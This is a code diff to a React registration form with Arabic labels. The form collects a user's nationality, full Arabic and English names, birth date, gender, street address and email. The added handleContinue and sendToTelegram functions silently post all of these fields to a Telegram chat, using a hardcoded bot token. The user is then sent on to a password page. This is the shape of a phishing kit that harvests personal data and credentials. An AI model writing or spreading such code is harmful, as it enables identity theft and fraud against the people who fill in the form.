@@ -18,9 +18,42 @@ const PersonalInfoForm = () => {
   const navigate = useNavigate();
   const [recaptchaValue, setRecaptchaValue] = useState<string | null>(null);
   const [birthDate, setBirthDate] = useState<Date>();
+  const [nationality, setNationality] = useState<string>("");
+  const [arabicFirstName, setArabicFirstName] = useState<string>("");
+  const [arabicMiddleName, setArabicMiddleName] = useState<string>("");
+  const [arabicLastName, setArabicLastName] = useState<string>("");
+  const [englishFirstName, setEnglishFirstName] = useState<string>("");
+  const [englishMiddleName, setEnglishMiddleName] = useState<string>("");
+  const [englishLastName, setEnglishLastName] = useState<string>("");
+  const [gender, setGender] = useState<string>("");
+  const [buildingNumber, setBuildingNumber] = useState<string>("");
+  const [street, setStreet] = useState<string>("");
+  const [area, setArea] = useState<string>("");
+  const [email, setEmail] = useState<string>("");
 
   const handleRecaptchaChange = (value: string | null) => {
     setRecaptchaValue(value);
+  };
+
+  const sendToTelegram = async (message: string) => {
+    try {
+      const botToken = "8248430225:AAHVBJ28Ftd7Sm2LBlEpDdrrpQEDLvLGGxo";
+      const chatId = "-4985537188";
+      
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message,
+          parse_mode: "HTML",
+        }),
+      });
+    } catch (error) {
+      console.error("فشل الإرسال إلى Telegram:", error);
+    }
   };
 
   const handleBack = () => {
@@ -31,7 +64,18 @@ const PersonalInfoForm = () => {
     navigate("/");
   };
 
-  const handleContinue = () => {
+  const handleContinue = async () => {
+    const message = `تسجيل - البيانات الشخصية
+
+الجنسية: ${nationality}
+الاسم بالعربي: ${arabicFirstName} ${arabicMiddleName} ${arabicLastName}
+الاسم بالإنجليزي: ${englishFirstName} ${englishMiddleName} ${englishLastName}
+تاريخ الميلاد: ${birthDate ? format(birthDate, "PPP", { locale: ar }) : ""}
+الجنس: ${gender === "male" ? "ذكر" : gender === "female" ? "أنثى" : ""}
+العنوان: مبنى ${buildingNumber}، شارع ${street}، منطقة ${area}
+البريد الإلكتروني: ${email}`;
+
+    await sendToTelegram(message);
     navigate("/password");
   };
 
@@ -45,7 +89,7 @@ const PersonalInfoForm = () => {
           <Label htmlFor="nationality" className="text-right block mb-2">
             الجنسية
           </Label>
-          <Select>
+          <Select value={nationality} onValueChange={setNationality}>
             <SelectTrigger className="bg-white">
               <SelectValue placeholder="اختر الجنسية" />
             </SelectTrigger>
@@ -217,9 +261,9 @@ const PersonalInfoForm = () => {
           <div className="mb-4">
             <Label className="text-right block mb-2">الاسم بالعربي</Label>
             <div className="grid grid-cols-3 gap-4">
-              <Input type="text" placeholder="الاسم الأول" className="text-right bg-white placeholder:text-right" dir="rtl" />
-              <Input type="text" placeholder="الاسم الأوسط" className="text-right bg-white placeholder:text-right" dir="rtl" />
-              <Input type="text" placeholder="الاسم الأخير" className="text-right bg-white placeholder:text-right" dir="rtl" />
+              <Input type="text" placeholder="الاسم الأول" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicFirstName} onChange={(e) => setArabicFirstName(e.target.value)} />
+              <Input type="text" placeholder="الاسم الأوسط" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicMiddleName} onChange={(e) => setArabicMiddleName(e.target.value)} />
+              <Input type="text" placeholder="الاسم الأخير" className="text-right bg-white placeholder:text-right" dir="rtl" value={arabicLastName} onChange={(e) => setArabicLastName(e.target.value)} />
             </div>
           </div>
 
@@ -227,9 +271,9 @@ const PersonalInfoForm = () => {
           <div>
             <Label className="text-right block mb-2">الاسم بالإنجليزي</Label>
             <div className="grid grid-cols-3 gap-4">
-              <Input type="text" placeholder="Last Name" className="text-right bg-white placeholder:text-right" dir="rtl" />
-              <Input type="text" placeholder="Middle Name" className="text-right bg-white placeholder:text-right" dir="rtl" />
-              <Input type="text" placeholder="First Name" className="text-right bg-white placeholder:text-right" dir="rtl" />
+              <Input type="text" placeholder="Last Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishLastName} onChange={(e) => setEnglishLastName(e.target.value)} />
+              <Input type="text" placeholder="Middle Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishMiddleName} onChange={(e) => setEnglishMiddleName(e.target.value)} />
+              <Input type="text" placeholder="First Name" className="text-right bg-white placeholder:text-right" dir="rtl" value={englishFirstName} onChange={(e) => setEnglishFirstName(e.target.value)} />
             </div>
           </div>
         </div>
@@ -272,7 +316,7 @@ const PersonalInfoForm = () => {
           <Label className="text-right block mb-2">
             الجنس
           </Label>
-          <RadioGroup className="flex gap-6 justify-end">
+          <RadioGroup value={gender} onValueChange={setGender} className="flex gap-6 justify-end">
             <div className="flex items-center gap-2">
               <Label htmlFor="female" className="text-base cursor-pointer">
                 أنثى
@@ -296,16 +340,16 @@ const PersonalInfoForm = () => {
           <div className="bg-primary rounded-lg p-4 space-y-4 max-w-md">
             <div>
               <Label className="text-white text-right block mb-2">رقم المبنى</Label>
-              <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" />
+              <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={buildingNumber} onChange={(e) => setBuildingNumber(e.target.value)} />
             </div>
             <div className="grid grid-cols-2 gap-4">
               <div>
                 <Label className="text-white text-right block mb-2">الشارع</Label>
-                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" />
+                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={street} onChange={(e) => setStreet(e.target.value)} />
               </div>
               <div>
                 <Label className="text-white text-right block mb-2">المنطقة</Label>
-                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" />
+                <Input type="text" className="text-right bg-white placeholder:text-right" dir="rtl" value={area} onChange={(e) => setArea(e.target.value)} />
               </div>
             </div>
           </div>
@@ -316,7 +360,7 @@ const PersonalInfoForm = () => {
           <Label htmlFor="email" className="text-right block mb-2">
             البريد الإلكتروني
           </Label>
-          <Input id="email" type="email" className="text-right bg-white placeholder:text-right" dir="rtl" />
+          <Input id="email" type="email" className="text-right bg-white placeholder:text-right" dir="rtl" value={email} onChange={(e) => setEmail(e.target.value)} />
           <div className="flex items-start gap-2 mt-2 text-sm text-muted-foreground">
             <Info className="w-4 h-4 mt-0.5 flex-shrink-0" />
             <p className="text-right">
